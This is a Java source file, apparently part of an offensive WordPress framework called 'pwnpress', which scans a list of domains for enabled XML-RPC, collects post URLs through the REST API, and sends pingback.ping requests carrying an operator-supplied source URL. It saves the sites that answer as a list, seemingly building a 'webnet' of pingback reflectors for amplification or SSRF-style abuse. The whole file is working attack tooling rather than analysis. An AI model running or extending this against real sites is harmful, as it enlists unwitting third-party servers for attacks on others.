package org.pwnpress.pingbacker;

import org.json.JSONArray;
import org.json.JSONObject;
import org.pwnpress.framework.WPFrameworkSettings;

import java.io.*;
import java.net.HttpURLConnection;
import java.net.URL;
import java.util.*;

public class WPWebnet {
    private static final int PORT = WPFrameworkSettings.getServerPort();
    private static String PUBLIC_ADDR;
    private static String OUTPUT_FILE;
    private static Set<String> SUCCESSFUL_PINGS = new HashSet<>();

    public static void build(String file) throws IOException {
        Scanner scanner = new Scanner(System.in);
        System.out.print("Enter the public server address: ");
        PUBLIC_ADDR = scanner.nextLine().trim();

        System.out.print("Enter output file name: ");
        OUTPUT_FILE = scanner.nextLine().trim();

        // Start the Pingback server
        PingbackServer.startServer();

        // Process domains
        List<String> domains = readDomainsFromFile(file);

        for (String domain : domains) {
            checkSite(domain);
        }

        // Write successful pings to output file
        writeResultsToFile();
        System.out.println("Results saved to " + OUTPUT_FILE);
    }

    private static List<String> readDomainsFromFile(String filePath) throws IOException {
        List<String> domains = new ArrayList<>();
        try (BufferedReader reader = new BufferedReader(new FileReader(filePath))) {
            String line;
            while ((line = reader.readLine()) != null) {
                domains.add(line.trim());
            }
        }
        return domains;
    }

    private static boolean isXmlrpcEnabled(String url) {
        try {
            HttpURLConnection connection = (HttpURLConnection) new URL(url).openConnection();
            connection.setRequestMethod("POST");
            connection.setRequestProperty("Content-Type", "text/xml");
            connection.setDoOutput(true);
            connection.getOutputStream().write("<?xml version=\"1.0\"?><methodCall><methodName>pingback.ping</methodName></methodCall>".getBytes());

            int responseCode = connection.getResponseCode();
            if (responseCode == 200) {
                System.out.println("XML-RPC is enabled at " + url);
                return true;
            } else {
                System.out.println("XML-RPC is NOT enabled at " + url + " (Response: " + responseCode + ")");
                return false;
            }
        } catch (Exception e) {
            System.out.println("XML-RPC request failed for " + url);
            return false;
        }
    }

    private static List<String> getPostUrls(String domain) {
        List<String> posts = new ArrayList<>();
        String apiUrl = "https://" + domain + "/wp-json/wp/v2/posts";

        try {
            URL url = new URL(apiUrl);
            HttpURLConnection conn = (HttpURLConnection) url.openConnection();
            conn.setRequestMethod("GET");

            int responseCode = conn.getResponseCode();
            if (responseCode != 200) {
                System.out.println("Failed to fetch posts from " + apiUrl + " (Response: " + responseCode + ")");
                return posts;
            }

            try (BufferedReader reader = new BufferedReader(new InputStreamReader(conn.getInputStream()))) {
                String response = reader.lines().reduce("", String::concat);
                posts.addAll(extractPostUrls(response));
            }

            if (posts.isEmpty()) {
                System.out.println("No posts found for " + domain + " (Empty array returned)");
            } else {
                System.out.println("Found " + posts.size() + " posts for " + domain);
            }
        } catch (Exception e) {
            System.out.println("Error fetching posts from " + apiUrl);
        }
        return posts;
    }

    private static List<String> extractPostUrls(String jsonResponse) {
        List<String> urls = new ArrayList<>();
        try {
            JSONArray jsonArray = new JSONArray(jsonResponse);
            for (int i = 0; i < jsonArray.length(); i++) {
                JSONObject post = jsonArray.getJSONObject(i);
                if (post.has("link")) {
                    urls.add(post.getString("link"));
                }
            }
        } catch (Exception e) {
            System.out.println("Error parsing JSON response.");
        }
        return urls;
    }

    private static void checkSite(String domain) {
        System.out.println("Checking " + domain + " ...");

        try {
            String xmlrpcUrl = "https://" + domain + "/xmlrpc.php";
            if (!isXmlrpcEnabled(xmlrpcUrl)) {
                return;
            }

            List<String> postUrls = getPostUrls(domain);
            if (postUrls.isEmpty()) {
                return;
            }

            for (String postUrl : postUrls) {
                if (testPingback(domain, postUrl)) {
                    SUCCESSFUL_PINGS.add(postUrl);
                    return;
                }
            }

            // Wait for Pingback
            while (true) {
                String pingbackUrl = PingbackServer.getLastReceivedPingback();
                if (pingbackUrl != null) {
                    SUCCESSFUL_PINGS.add(pingbackUrl);
                    break;
                }
            }
        } catch (Exception e) {
            System.out.println("Error checking site: " + domain);
        }
    }

    private static boolean testPingback(String domain, String postUrl) {
        try {
            String sourceUrl = "https://" + PUBLIC_ADDR + "/pingback";
            String xmlPayload = "<?xml version=\"1.0\"?><methodCall><methodName>pingback.ping</methodName><params><param><value>" + sourceUrl + "</value></param><param><value>" + postUrl + "</value></param></params></methodCall>";

            HttpURLConnection connection = (HttpURLConnection) new URL("https://" + domain + "/xmlrpc.php").openConnection();
            connection.setRequestMethod("POST");
            connection.setRequestProperty("Content-Type", "text/xml");
            connection.setDoOutput(true);
            connection.getOutputStream().write(xmlPayload.getBytes());

            int responseCode = connection.getResponseCode();
            if (responseCode == 200) {
                System.out.println("Pingback successful for " + postUrl);
                return true;
            } else {
                System.out.println("Pingback failed for " + postUrl + " (Response: " + responseCode + ")");
                return false;
            }
        } catch (Exception e) {
            System.out.println("Error testing pingback for " + domain + " -> " + postUrl);
            return false;
        }
    }

    private static void writeResultsToFile() {
        try (PrintWriter writer = new PrintWriter(new FileWriter(OUTPUT_FILE))) {
            for (String url : SUCCESSFUL_PINGS) {
                writer.println(url);
            }
        } catch (IOException e) {
            System.out.println("Error writing results to file.");
        }
    }
}
